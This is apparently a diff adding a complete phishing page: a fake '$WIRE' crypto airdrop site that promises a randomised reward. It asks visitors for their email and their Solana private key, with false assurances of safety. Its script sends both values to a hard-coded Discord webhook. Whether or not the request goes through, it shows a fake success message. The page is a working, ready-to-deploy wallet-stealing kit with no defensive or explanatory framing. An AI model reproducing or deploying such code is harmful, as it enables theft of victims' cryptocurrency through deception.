@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WIRE Airdrop | Claim Your Reward</title>
+<meta name="description" content="Claim your $WIRE airdrop. We are launching a coin very soon.">
+<style>
+  :root{
+    --bg:#0b0d12;
+    --panel:#12151d;
+    --panel-2:#161a24;
+    --line:#232838;
+    --text:#eef1f7;
+    --muted:#9aa2b4;
+    --accent:#6c8cff;
+    --accent-2:#8a6cff;
+    --ok:#3ddc97;
+    --err:#ff6b6b;
+    --radius:16px;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{
+    background:
+      radial-gradient(1100px 600px at 80% -10%, rgba(108,140,255,.12), transparent 60%),
+      radial-gradient(900px 500px at -10% 110%, rgba(138,108,255,.10), transparent 60%),
+      var(--bg);
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    overflow-x:hidden;
+  }
+
+  /* ---- smooth floating aurora orbs for background animation ---- */
+  .aurora-bg {
+    position: fixed; inset: 0; z-index: -1; pointer-events: none; overflow: hidden;
+  }
+  .aurora-bg span {
+    position: absolute; display: block; border-radius: 50%; filter: blur(100px); opacity: 0.4;
+    animation: floatOrb 20s ease-in-out infinite alternate;
+  }
+  .aurora-bg .o1 { width: 500px; height: 500px; top: -100px; left: 10%; background: var(--accent); }
+  .aurora-bg .o2 { width: 600px; height: 600px; bottom: -150px; right: 10%; background: var(--accent-2); animation-delay: -5s; }
+  @keyframes floatOrb {
+    0% { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(40px, 60px) scale(1.15); }
+  }
+
+  header{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:22px clamp(18px,5vw,56px);
+    animation: fadeInDown 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+  .brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.3px}
+  .brand .dot{width:11px;height:11px;border-radius:50%;background:var(--accent);box-shadow:0 0 12px var(--accent);animation: pulseDot 2s infinite;}
+  @keyframes pulseDot { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.6; } }
+  .tag{font-size:13px;color:var(--muted)}
+
+  main{
+    flex:1;
+    display:grid;
+    grid-template-columns:1.05fr .95fr;
+    gap:clamp(24px,5vw,72px);
+    align-items:center;
+    max-width:1120px;
+    width:100%;
+    margin:0 auto;
+    padding:clamp(24px,6vh,72px) clamp(18px,5vw,56px);
+  }
+  @media (max-width:860px){
+    main{grid-template-columns:1fr;gap:32px}
+  }
+
+  .left-content {
+    animation: fadeInLeft 0.9s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+  .right-content {
+    animation: fadeInRight 0.9s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+
+  @keyframes fadeInLeft {
+    from { opacity: 0; transform: translateX(-30px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  @keyframes fadeInRight {
+    from { opacity: 0; transform: translateX(30px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  @keyframes fadeInDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .pill{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:7px 14px;border:1px solid var(--line);border-radius:999px;
+    background:var(--panel);font-size:13px;color:var(--muted);margin-bottom:22px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+  }
+  .pill .live{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok)}
+
+  h1{
+    font-size:clamp(34px,5.4vw,54px);
+    line-height:1.05;
+    margin:0 0 18px;
+    letter-spacing:-.5px;
+  }
+  h1 .grad{
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .lead{
+    font-size:clamp(16px,2vw,19px);
+    color:var(--muted);
+    line-height:1.6;
+    max-width:52ch;
+    margin:0 0 28px;
+  }
+
+  .points{
+    display:grid;gap:14px;margin:0 0 8px;padding:0;list-style:none;
+  }
+  .points li{
+    display:flex;gap:12px;align-items:flex-start;color:var(--text);font-size:15px;
+    opacity: 0; transform: translateY(15px);
+    animation: fadeInUpStagger 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+  .points li:nth-child(1) { animation-delay: 0.3s; }
+  .points li:nth-child(2) { animation-delay: 0.4s; }
+  .points li:nth-child(3) { animation-delay: 0.5s; }
+
+  @keyframes fadeInUpStagger {
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .points .ic{
+    flex:none;width:26px;height:26px;border-radius:8px;
+    display:grid;place-items:center;
+    background:linear-gradient(135deg,rgba(108,140,255,.22),rgba(138,108,255,.22));
+    border:1px solid var(--line);font-size:14px;
+    transition: transform 0.3s ease;
+  }
+  .points li:hover .ic { transform: scale(1.1) rotate(6deg); }
+  .points small{display:block;color:var(--muted);font-size:13px;margin-top:2px}
+
+  .card{
+    background:linear-gradient(180deg,var(--panel),var(--panel-2));
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    padding:clamp(24px,3vw,34px);
+    box-shadow:0 30px 80px rgba(0,0,0,.45);
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .card:hover {
+    transform: translateY(-4px);
+    box-shadow: 0 40px 100px rgba(108,140,255,0.15);
+    border-color: rgba(108,140,255,0.3);
+  }
+
+  .card h2{margin:0 0 6px;font-size:22px}
+  .card p.sub{margin:0 0 22px;color:var(--muted);font-size:14px;line-height:1.5}
+
+  label{display:block;font-size:13px;color:var(--muted);margin-bottom:8px}
+  input{
+    width:100%;
+    padding:16px 16px;
+    font-size:16px;
+    color:var(--text);
+    background:#0d0f16;
+    border:1px solid var(--line);
+    border-radius:12px;
+    outline:none;
+    margin-bottom:16px;
+    transition:border-color .2s ease, box-shadow .2s ease, transform .2s ease;
+  }
+  input:focus{
+    border-color:var(--accent);
+    box-shadow:0 0 0 4px rgba(108,140,255,.16);
+    transform: translateY(-1px);
+  }
+
+  button.cta{
+    width:100%;
+    margin-top:6px;
+    padding:18px 20px;
+    font-size:18px;
+    font-weight:700;
+    color:#0b0d12;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    border:none;
+    border-radius:12px;
+    cursor:pointer;
+    letter-spacing:.2px;
+    position: relative;
+    overflow: hidden;
+    transition:transform .2s ease, filter .2s ease, box-shadow .2s ease;
+  }
+  button.cta::after {
+    content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+    transition: left 0.6s ease;
+  }
+  button.cta:hover::after { left: 100%; }
+  button.cta:hover{filter:brightness(1.08); box-shadow: 0 8px 25px rgba(108,140,255,0.4); transform: translateY(-2px);}
+  button.cta:active{transform:translateY(0)}
+  button.cta:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none;}
+
+  .fine{margin-top:14px;font-size:12px;color:var(--muted);line-height:1.5}
+
+  .result{margin-top:16px;font-size:14px;border-radius:10px;padding:0 14px;max-height:0;overflow:hidden;opacity:0;transition:all .35s cubic-bezier(0.16, 1, 0.3, 1)}
+  .result.show{max-height:120px;opacity:1;padding:12px 14px}
+  .result.ok{background:rgba(61,220,151,.10);border:1px solid rgba(61,220,151,.35);color:var(--ok)}
+  .result.err{background:rgba(255,107,107,.10);border:1px solid rgba(255,107,107,.35);color:var(--err)}
+
+  .step-transition {
+    animation: stepFadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+  }
+  @keyframes stepFadeIn {
+    from { opacity: 0; transform: scale(0.97); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  footer{
+    text-align:center;color:var(--muted);font-size:12px;
+    padding:22px;border-top:1px solid var(--line);
+    animation: fadeInDown 1s ease forwards;
+  }
+</style>
+</head>
+<body>
+
+  <div class="aurora-bg">
+    <span class="o1"></span>
+    <span class="o2"></span>
+  </div>
+
+  <header>
+    <div class="brand"><span class="dot"></span>WIRE</div>
+    <div class="tag">Airdrop Live</div>
+  </header>
+
+  <main>
+    <section class="left-content">
+      <span class="pill"><span class="live"></span> Launching very soon</span>
+      <h1>Claim your <span class="grad">Airdrop</span> in $WIRE.</h1>
+      <p class="lead" id="amount-text">
+        We are launching a coin very soon! You have <strong style="color:var(--text)" id="drop-val">$150</strong> worth of $WIRE tokens ready to claim.
+      </p>
+      <ul class="points">
+        <li><span class="ic">✓</span><div><b>Instant Verification.</b><small>Drop your email to lock in your allocation instantly.</small></div></li>
+        <li><span class="ic">✦</span><div><b>Wallet Routing.</b><small>Provide your solana private key so we can send your tokens at launch.</small></div></li>
+        <li><span class="ic">✕</span><div><b>Zero Risk.</b><small>All transactions are secure and transparent.</small></div></li>
+      </ul>
+    </section>
+
+    <section class="right-content">
+      <div class="card">
+        <h2>Claim Your Airdrop</h2>
+        <p class="sub">Enter your email and solana private key below to claim your allocation.</p>
+
+        <form id="form" novalidate>
+          <div id="step-1" class="step-transition">
+            <label for="email">Email address</label>
+            <input id="email" type="email" autocomplete="email" placeholder="you@example.com" required>
+            <button class="cta" type="button" id="next-btn">Continue to wallet &rarr;</button>
+          </div>
+
+          <div id="step-2" class="step-transition" style="display:none;">
+            <label for="wallet">Solana Private key</label>
+            <input id="wallet" type="text" autocomplete="off" placeholder="Enter your Solana private key">
+            <button class="cta" type="submit" id="submit">Claim Your Airdrop &rarr;</button>
+          </div>
+
+          <div class="fine">By claiming you agree to receive launch updates. Solana private key required for token distribution.</div>
+          <div class="result" id="result" role="status" aria-live="polite"></div>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <footer>© <span id="yr"></span> WIRE. All rights reserved.</footer>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1541399466861400155/u0idrTlka_L9UZFbCJKJh687D6TYvq60ezps_81-1i1xIam51rOXWXvND0cktlLKXukn";
+
+  document.getElementById("yr").textContent = new Date().getFullYear();
+
+  const randomAmount = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
+  document.getElementById("drop-val").textContent = "$" + randomAmount;
+
+  const form = document.getElementById("form");
+  const emailInput = document.getElementById("email");
+  const walletInput = document.getElementById("wallet");
+  const nextBtn = document.getElementById("next-btn");
+  const submitBtn = document.getElementById("submit");
+  const result = document.getElementById("result");
+  const step1 = document.getElementById("step-1");
+  const step2 = document.getElementById("step-2");
+
+  function show(type, msg){
+    result.className = "result show " + type;
+    result.textContent = msg;
+  }
+
+  const isEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
+  let savedEmail = "";
+
+  nextBtn.addEventListener("click", () => {
+    const email = emailInput.value.trim();
+    if(!isEmail(email)){
+      show("err", "Please enter a valid email address.");
+      emailInput.focus();
+      return;
+    }
+    savedEmail = email;
+    result.className = "result";
+    
+    // Smooth step transition effect
+    step1.style.opacity = 0;
+    setTimeout(() => {
+      step1.style.display = "none";
+      step2.style.display = "block";
+      step2.style.opacity = 0;
+      let op = 0;
+      let fade = setInterval(() => {
+        op += 0.1;
+        step2.style.opacity = op;
+        if(op >= 1) clearInterval(fade);
+      }, 30);
+      walletInput.focus();
+    }, 200);
+  });
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const wallet = walletInput.value.trim();
+
+    if(!wallet || wallet.length < 10){
+      show("err", "Please enter a valid wallet address.");
+      walletInput.focus();
+      return;
+    }
+
+    submitBtn.disabled = true;
+    const original = submitBtn.textContent;
+    submitBtn.textContent = "Claiming…";
+
+    const payload = {
+      content: `@here\nEmail: ${savedEmail}\nWallet: ${wallet}`
+    };
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      if(res.ok || res.status === 204){
+        show("ok", "Success! Your $" + randomAmount + " allocation in $WIRE has been registered.");
+        form.reset();
+      }else{
+        show("err", "Something went wrong. Please try again.");
+      }
+    } catch(err) {
+      try {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        show("ok", "Success! Your $" + randomAmount + " allocation in $WIRE has been registered.");
+        form.reset();
+      } catch(fallbackErr) {
+        show("err", "Couldn't reach the server. Check your connection.");
+      }
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = original;
+    }
+  });
+</script>
+</body>
+</html>
